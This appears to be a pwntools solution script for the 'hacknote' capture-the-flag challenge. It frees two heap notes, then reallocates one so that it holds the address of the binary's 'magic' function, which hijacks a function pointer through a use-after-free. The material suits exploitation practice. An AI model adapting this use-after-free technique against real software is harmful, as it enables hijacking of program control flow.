from pwn import *

fpath = "./hacknote"
p = process(fpath)
elf = ELF(fpath)

def addnote(len , content):
	p.recvuntil(":")
	p.sendline("1")
	p.recvuntil(":")
	p.sendline(str(len))
	p.recvuntil(":")
	p.sendline(content)

def delnote(idx):
	p.recvuntil(":")
	p.sendline("2")
	p.recvuntil(":")
	p.sendline(str(idx))
	p.recvuntil("Success")

def printnote(idx):
	p.recvuntil(":")
	p.sendline("3")
	p.recvuntil(":")
	p.sendline(str(idx))
	print p.recv()

magic_addr = elf.symbols["magic"]

addnote(16 , "aaaa")
addnote(16 , "bbbb")

delnote(0)
delnote(1)

addnote(8 , p32(magic_addr))
printnote(0)
